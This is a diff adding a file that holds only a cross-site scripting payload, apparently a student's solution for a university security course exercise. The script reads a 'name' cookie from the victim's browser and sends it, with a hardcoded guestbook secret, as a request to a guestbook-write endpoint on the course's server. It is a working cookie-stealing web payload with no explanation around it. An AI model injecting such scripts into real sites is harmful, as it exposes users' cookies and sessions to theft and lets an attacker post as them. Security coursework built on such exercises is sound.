@@ -1,0 +1,9 @@
+<script>
+	username = document.cookie.match(new RegExp("name" + "=[^;]*"));
+	xhttp = new XMLHttpRequest();
+	xhttp.open("GET", 
+"https://insecurityclass.cs.uchicago.edu/4/guestbookwrite.php?guestbooksecret=thenighttheskeletonscametolife&guestbookname=" 
++ username + "&guestbookmessage=redgene");
+	xhttp.send();
+</script>
+
